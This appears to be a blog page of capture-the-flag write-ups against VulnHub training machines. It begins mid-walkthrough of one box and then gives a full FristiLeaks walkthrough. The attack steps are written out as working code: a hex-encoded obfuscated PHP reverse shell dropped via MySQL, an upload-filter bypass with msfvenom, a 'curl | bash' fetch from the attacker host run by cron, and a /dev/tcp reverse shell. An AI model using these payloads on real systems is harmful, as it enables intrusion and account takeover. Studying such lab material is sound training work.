020202468616e646c653d70726f635f6f70656e2824632c6172726179286172726179282770697065272c277227292c6172726179282770697065272c277727292c6172726179282770697065272c27772729292c247069706573293b0a202020202020202024656676614f623d4e554c4c3b0a20202020202020207768696c65282166656f66282470697065735b315d29297b0a2020202020202020202024656676614f622e3d6672656164282470697065735b315d2c31303234293b0a20202020202020207d0a20202020202020204070726f635f636c6f7365282468616e646c65293b0a2020202020207d656c73650a2020202020207b0a202020202020202024656676614f623d303b0a2020202020207d0a20202020
</code></pre></div></div>

<p>We access the wordpress database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>mysql <span class="nt">-h</span> 192.168.179.171 <span class="nt">-u</span> root <span class="nt">-D</span> wordpress <span class="nt">-p</span>
Enter password: 
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 7
Server version: 5.7.12-0ubuntu1 <span class="o">(</span>Ubuntu<span class="o">)</span>

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MySQL <span class="o">[</span>wordpress]&gt;
</code></pre></div></div>

<p>Then we write the php reverse shell on the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MySQL <span class="o">[</span>wordpress]&gt; <span class="k">select </span>0x2f2a3c3f706870202f2a2a2f0a202020202020406572726f725f7265706f7274696e672830293b0a202020202020407365745f74696d655f6c696d69742830293b204069676e6f72655f757365725f61626f72742831293b2040696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b0a202020202020246f6367785a566d3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b0a20202020202069662821656d70747928246f6367785a566d29297b0a2020202020202020246f6367785a566d3d707265675f7265706c61636528272f5b2c205d2b2f272c20272c272c20246f6367785a566d293b0a2020202020202020246f6367785a566d3d6578706c6f646528272c272c20246f6367785a566d293b0a2020202020202020246f6367785a566d3d61727261795f6d617028277472696d272c20246f6367785a566d293b0a2020202020207d656c73657b0a2020202020202020246f6367785a566d3d617272617928293b0a2020202020207d0a2020202020202463203d206261736536345f6465636f64652827634756796243417454556c504943316c4943636b6344316d62334a724f325634615851736157596f4a4841704f79526a5057356c6479424a547a6f365532396a613256304f6a704a546b56554b46426c5a584a425a4752794c4349784f5449754d5459344c6a45334f5334784f6a51304d7949704f314e5552456c4f4c54356d5a4739775a57346f4a474d7363696b374a483474506d5a6b6233426c6269676b597978334b54747a65584e305a57306b5879423361476c735a54772b4f79633d27293b0a2020202020206966202846414c534520213d3d20737472706f7328737472746f6c6f776572285048505f4f53292c202777696e27202929207b0a202020202020202024633d24632e2220323e26315c6e223b0a2020202020207d0a202020202020244f447a633d2769735f63616c6c61626c65273b0a20202020202024426a4f44683d27696e5f6172726179273b0a2020202020200a202020202020696628244f447a632827706f70656e2729616e642124426a4f44682827706f70656e272c246f6367785a566d29297b0a20202020202020202466703d706f70656e2824632c277227293b0a202020202020202024656676614f623d4e554c4c3b0a202020202020202069662869735f7265736f757263652824667029297b0a202020202020202020207768696c65282166656f662824667029297b0a20202020202020202020202024656676614f622e3d6672656164282466702c31303234293b0a202020202020202020207d0a20202020202020207d0a20202020202020204070636c6f736528246670293b0a2020202020207d656c73650a202020202020696628244f447a63282770617373746872752729616e642124426a4f446828277061737374687275272c246f6367785a566d29297b0a20202020202020206f625f737461727428293b0a20202020202020207061737374687275282463293b0a202020202020202024656676614f623d6f625f6765745f636f6e74656e747328293b0a20202020202020206f625f656e645f636c65616e28293b0a2020202020207d656c73650a202020202020696628244f447a632827657865632729616e642124426a4f4468282765786563272c246f6367785a566d29297b0a202020202020202024656676614f623d617272617928293b0a2020202020202020657865632824632c24656676614f62293b0a202020202020202024656676614f623d6a6f696e28636872283130292c24656676614f62292e636872283130293b0a2020202020207d656c73650a202020202020696628244f447a63282773797374656d2729616e642124426a4f4468282773797374656d272c246f6367785a566d29297b0a20202020202020206f625f737461727428293b0a202020202020202073797374656d282463293b0a202020202020202024656676614f623d6f625f6765745f636f6e74656e747328293b0a20202020202020206f625f656e645f636c65616e28293b0a2020202020207d656c73650a202020202020696628244f447a6328277368656c6c5f657865632729616e642124426a4f446828277368656c6c5f65786563272c246f6367785a566d29297b0a202020202020202024656676614f623d7368656c6c5f65786563282463293b0a2020202020207d656c73650a202020202020696628244f447a63282770726f635f6f70656e2729616e642124426a4f4468282770726f635f6f70656e272c246f6367785a566d29297b0a20202020202020202468616e646c653d70726f635f6f70656e2824632c6172726179286172726179282770697065272c277227292c6172726179282770697065272c277727292c6172726179282770697065272c27772729292c247069706573293b0a202020202020202024656676614f623d4e554c4c3b0a20202020202020207768696c65282166656f66282470697065735b315d29297b0a2020202020202020202024656676614f622e3d6672656164282470697065735b315d2c31303234293b0a20202020202020207d0a20202020202020204070726f635f636c6f7365282468616e646c65293b0a2020202020207d656c73650a2020202020207b0a202020202020202024656676614f623d303b0a2020202020207d0a20202020 into dumpfile <span class="s1">'/var/www/https/blogblog/wp-content/uploads/shell.php'</span><span class="p">;</span>
Query OK, 1 row affected <span class="o">(</span>0.009 sec<span class="o">)</span>
</code></pre></div></div>

<p>We start a netcat listener on port 443 and run the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="s1">'https://192.168.179.171:12380/blogblog/wp-content/uploads/shell.php'</span>
</code></pre></div></div>

<p>We got a low privilege shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                            
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.171] 49282
python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
www-data@red:/var/www/https/blogblog/wp-content/uploads<span class="err">$</span>
</code></pre></div></div>

<p>While listing the users <strong>.bash_history</strong> file I found the password of user JKanode and peter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/var/www/https/blogblog/wp-content/uploads<span class="nv">$ </span><span class="nb">cd</span> /home
www-data@red:/home<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'.bash_history'</span> <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span>
...
sshpass <span class="nt">-p</span> thisimypassword ssh JKanode@localhost
apt-get <span class="nb">install </span>sshpass
sshpass <span class="nt">-p</span> JZQuyIN5 peter@localhost
...
</code></pre></div></div>

<p>I switched to the user peter, after providing the password a message is presented, to skip it simply press enter or add !/bin/bash</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/home<span class="nv">$ </span>su peter                                                                                                                                        
su peter                                                                                                                                                            
Password: JZQuyIN5                                                                                                                                                  
                                                                                                                                                                    
This is the Z Shell configuration <span class="k">function for </span>new <span class="nb">users</span>,                                                                                                           
zsh-newuser-install.                                                                                                                                                
You are seeing this message because you have no zsh startup files                                                                                                   
<span class="o">(</span>the files .zshenv, .zprofile, .zshrc, .zlogin <span class="k">in </span>the directory                                                                                                     
~<span class="o">)</span><span class="nb">.</span>  This <span class="k">function </span>can <span class="nb">help </span>you with a few settings that should                                                                                                     
make your use of the shell easier.                                                                                                                                  
                                                                                                                                                                    
You can:                                                                                                                                                            
                                                                                                                                                                    
<span class="o">(</span>q<span class="o">)</span>  Quit and <span class="k">do </span>nothing.  The <span class="k">function </span>will be run again next time.                                                                                                
                                                                                                                                                                    
<span class="o">(</span>0<span class="o">)</span>  Exit, creating the file ~/.zshrc containing just a comment.                                                                                                    
     That will prevent this <span class="k">function </span>being run again.

<span class="o">(</span>1<span class="o">)</span>  Continue to the main menu.

<span class="o">(</span>2<span class="o">)</span>  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and <span class="nb">exit</span> <span class="o">(</span>you will need to edit
     the file by hand, <span class="k">if </span>so desired<span class="o">)</span><span class="nb">.</span>

<span class="nt">---</span> Type one of the keys <span class="k">in </span>parentheses <span class="nt">---</span> <span class="o">!</span>/bin/bash
<span class="o">!</span>/bin/bash^J
Aborting.
The <span class="k">function </span>will be run again next time.  To prevent this, execute:
  <span class="nb">touch</span> ~/.zshrc
red% /bin/bash                                                                  
peter@red:/home<span class="err">$</span>
</code></pre></div></div>

<p>As we can see the user peter is allowed to run any command as sudo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@red:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                                            
<span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                                                             
                                                                                                                                                                    
We trust you have received the usual lecture from the <span class="nb">local </span>System                                                                                                  
Administrator. It usually boils down to these three things:                                                                                                         
                                                                                                                                                                    
    <span class="c">#1) Respect the privacy of others.                                                                                                                              </span>
    <span class="c">#2) Think before you type.</span>
    <span class="c">#3) With great power comes great responsibility.</span>

<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>peter: JZQuyIN5

Matching Defaults entries <span class="k">for </span>peter on red:
    <span class="nv">lecture</span><span class="o">=</span>always, env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User peter may run the following commands on red:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>We run the following command and we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@red:/home<span class="nv">$ </span><span class="nb">sudo </span>su -
<span class="nb">sudo </span>su -
➜  ~ <span class="nb">ls                                                                        
ls
</span>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
➜  ~ <span class="nb">cat </span>flag.txt                                                              
<span class="nb">cat </span>flag.txt
~~~~~~~~~~&lt;<span class="o">(</span>Congratulations<span class="o">)&gt;</span>~~~~~~~~~~
                          .-<span class="s1">'''''-.
                          |'</span><span class="nt">-----</span><span class="s1">'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'</span><span class="nt">-----</span><span class="s1">'`
 '</span><span class="nt">--------</span><span class="s1">'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
</span></code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Fristileaks</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.</p>

<p><strong>Author:</strong> Ar0xA</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">https://www.vulnhub.com/entry/fristileaks-13,133/</a></p>

<p>You need to edit the VM’s MAC address to 08:00:27:A5:A6:76 for it to works.</p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan discovered the target machine, the script you can download it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.169 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>The full TCP/UDP scan with unicornscan found only one port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.169:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.169:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
...
listener statistics 104316 packets recieved 0 packets droped and 0 interface drops
TCP open                    http[   80]         from 192.168.179.169  ttl 64 
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Service detection and script scanning was performed against the open port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span> 192.168.179.169 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3<span class="o">)</span>
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Nothing was found in the web page including the robots.txt file.</p>

<p><img src="/assets/images/fristileaks/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.169/robots.txt                           
User-agent: <span class="k">*</span>
Disallow: /cola
Disallow: /sisi
Disallow: /beer
</code></pre></div></div>

<p>Reading the image of the home page I tried to look up the word <strong>fristi</strong> in the browser and it redirected me to an admin page.</p>

<p><img src="/assets/images/fristileaks/screenshot-2.png" alt="" /></p>

<p>In the source of the page I found the user <strong>eezeepz</strong>, and at the bottom of the page a base 64 encoded string.</p>

<p><img src="/assets/images/fristileaks/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/fristileaks/screenshot-4.png" alt="" /></p>

<p>I decoded the base 64 string, this contains an image with a password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.169/fristi/ | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'1703,1724p'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> image.png

root@kali:~<span class="nv">$ </span>ristretto image.png
</code></pre></div></div>

<p><img src="/assets/images/fristileaks/screenshot-5.png" alt="" /></p>

<p>I logged in with those creds and has access to a file upload page.</p>

<p><img src="/assets/images/fristileaks/screenshot-6.png" alt="" /></p>

<p><img src="/assets/images/fristileaks/screenshot-7.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="file-upload">File Upload</h3>

<p>To bypass the file upload functionality was possible adding the jpg extension to the php reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_perl <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-o</span> z.php.jpg
</code></pre></div></div>

<p>We upload the reverse shell, this was created successfully into the uploads directory.</p>

<p><img src="/assets/images/fristileaks/screenshot-8.png" alt="" /></p>

<p><img src="/assets/images/fristileaks/screenshot-9.png" alt="" /></p>

<p>We start a netcat listener on port 443 and run the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.169/fristi/uploads/z.php.jpg
</code></pre></div></div>

<p>We get a shell with apache permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.169] 34123
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
script <span class="nt">-qc</span> /bin/bash /dev/null
bash-4.1<span class="nv">$ </span>
</code></pre></div></div>

<p>I found a note in the <strong>/var/www/</strong> directory for <strong>eezeepz</strong>, this catches my attention.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /var/www
<span class="nb">cd</span> /var/www
bash-4.1<span class="nv">$ </span><span class="nb">ls 
ls 
</span>cgi-bin  error  html  icons  notes.txt
bash-4.1<span class="nv">$ </span><span class="nb">cat </span>notes.txt 
<span class="nb">cat </span>notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

<span class="nt">-jerry</span>
</code></pre></div></div>

<p>There are many files in eezeepzs’s home directory .</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /home/eezeepz
bash-4.1<span class="nv">$ </span><span class="nb">ls 
</span>MAKEDEV    <span class="nb">chown        hostname  </span>netreport       taskset     weak-modules
cbq        clock        hwclock   netstat         tc          wipefs
cciss_id   consoletype  kbd_mode  new-kernel-pkg  telinit     xfs_repair
cfdisk     cpio         <span class="nb">kill      nice            touch       </span>ypdomainname
chcpu      cryptsetup   killall5  nisdomainname   tracepath   zcat
<span class="nb">chgrp      </span>ctrlaltdel   kpartx    nologin         tracepath6  zic
chkconfig  <span class="nb">cut          </span>nameif    notes.txt       <span class="nb">true
chmod      </span>halt         nano      <span class="nb">tar             </span>tune2fs
</code></pre></div></div>

<p>The notes.txt file contains a message that we can use the binaries specifying the full path <strong>/usr/bin/</strong> or <strong>/home/admin/</strong>, we can write our commands ia a file called <strong>runthis</strong> in /tmp directory, a cron job is working behind this.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">cat </span>notes.txt
Yo EZ,

I made it possible <span class="k">for </span>you to <span class="k">do </span>some automated checks, 
but I did only allow you access to /usr/bin/<span class="k">*</span> system binaries. I did
however copy a few extra often needed commands to my 
homedir: <span class="nb">chmod</span>, <span class="nb">df</span>, <span class="nb">cat</span>, <span class="nb">echo</span>, ps, <span class="nb">grep</span>, egrep so you can use those
from /home/admin/

Don<span class="s1">'t forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
</span></code></pre></div></div>

<p>A cron job with admin permissions is running, we can see it by listing the processes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span>ps auxwe | <span class="nb">grep </span>admin
ps auxwe | <span class="nb">grep </span>admin
admin     2063  0.0  0.7 115048  3768 ?        Ss   03:59   0:00 /usr/bin/python /home/admin/cronjob.py
</code></pre></div></div>

<p>To get a shell as the user <strong>admin</strong>, I created the <strong>runthis</strong> file with a curl command that downloads our bash reverse shell and executes it, and finally I give it execute perisssions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/usr/bin/curl 192.168.179.1:8000/getadmin | bash'</span> <span class="o">&gt;</span> /tmp/runthis
bash-4.1<span class="nv">$ </span><span class="nb">chmod</span> +x /tmp/runthis
</code></pre></div></div>

<p>On the attacking machine I create a bash reverse shell and start a web server with python.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/1337 0&gt;&amp;1"'</span> <span class="o">&gt;</span> getadmin
root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 
</code></pre></div></div>

<p>We wait a moment and we have a shell as user <strong>admin</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.169] 50841
bash: no job control <span class="k">in </span>this shell
<span class="o">[</span>admin@localhost ~]<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
<span class="o">[</span>admin@localhost ~]<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span>
</code></pre></div></div>

<p>In the home directory there are two files that contain an encoded string.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>admin@localhost ~]<span class="nv">$ </span><span class="nb">cat </span>cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

<span class="o">[</span>admin@localhost ~]<span class="nv">$ </span><span class="nb">cat </span>whoisyourgodnow.txt
<span class="nb">cat </span>whoisyourgodnow.txt
<span class="o">=</span>RFn0AKnlMHMPIzpyuTI0ITG
</code></pre></div></div>

<p>Also was found a python script that encodes a string to base64, rot13 and reverts it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>admin@localhost ~]<span class="nv">$ </span><span class="nb">cat </span>cryptpass.py
<span class="nb">cat </span>cryptpass.py
<span class="c">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
import <span class="nb">base64</span>,codecs,sys

def encodeString<span class="o">(</span>str<span class="o">)</span>:
    <span class="nv">base64string</span><span class="o">=</span> base64.b64encode<span class="o">(</span>str<span class="o">)</span>
    <span class="k">return </span>codecs.encode<span class="o">(</span>base64string[::-1], <span class="s1">'rot13'</span><span class="o">)</span>

<span class="nv">cryptoResult</span><span class="o">=</span>encodeString<span class="o">(</span>sys.argv[1]<span class="o">)</span>
print cryptoResult
</code></pre></div></div>

<p>The following python script performs the reverse process.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">codecs</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">f"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [string]"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">string</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># Decode the Rot13 string
</span><span class="k">def</span> <span class="nf">decodeRot13</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">codecs</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="s">'rot13'</span><span class="p">)</span>

<span class="c1"># Reverse the string
</span><span class="k">def</span> <span class="nf">revString</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
   <span class="k">return</span> <span class="n">x</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># Decode the base64 string
</span><span class="k">def</span> <span class="nf">b64Decode</span><span class="p">(</span><span class="n">y</span><span class="p">):</span>
    <span class="n">string</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">string</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>

<span class="n">txt</span> <span class="o">=</span> <span class="n">b64Decode</span><span class="p">(</span><span class="n">decodeRot13</span><span class="p">(</span><span class="n">revString</span><span class="p">(</span><span class="n">string</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the script and get the password for <strong>fristigod</strong> user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 decryptpass.py <span class="o">=</span>RFn0AKnlMHMPIzpyuTI0ITG 
LetThereBeFristi!
</code></pre></div></div>

<p>We switched to the user <strong>fristigod</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>admin@localhost ~]<span class="nv">$ </span>su - fristigod
su - fristigod
Password: LetThereBeFristi!

<span class="nt">-bash-4</span>.1<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span>
</code></pre></div></div>

<p>Listing the sudo permissions, we see that <strong>fristigod</strong> can execue the <strong>doCom</strong> script as user fristi.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-4</span>.1<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>fristigod: LetThereBeFristi!

Matching Defaults entries <span class="k">for </span>fristigod on this host:
    requiretty, <span class="o">!</span>visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin

User fristigod may run the following commands on this host:
    <span class="o">(</span>fristi : ALL<span class="o">)</span> /var/fristigod/.secret_admin_stuff/doCom
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>To get root we need to run <strong>doCom</strong> script as user <strong>fristi</strong> and add bash as parameter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-4</span>.1<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom bash
<span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom bash
bash-4.1# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>,502<span class="o">(</span>fristigod<span class="o">)</span>


bash-4.1# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
bash-4.1# <span class="nb">ls
ls
</span>fristileaks_secrets.txt
bash-4.1# <span class="nb">cat </span>fristileaks_secrets.txt
<span class="nb">cat </span>fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA <span class="o">[</span>https://tldr.nu]

I wonder <span class="k">if </span>you beat it <span class="k">in </span>the maximum 4 hours it<span class="s1">'s supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
</span></code></pre></div></div>

  
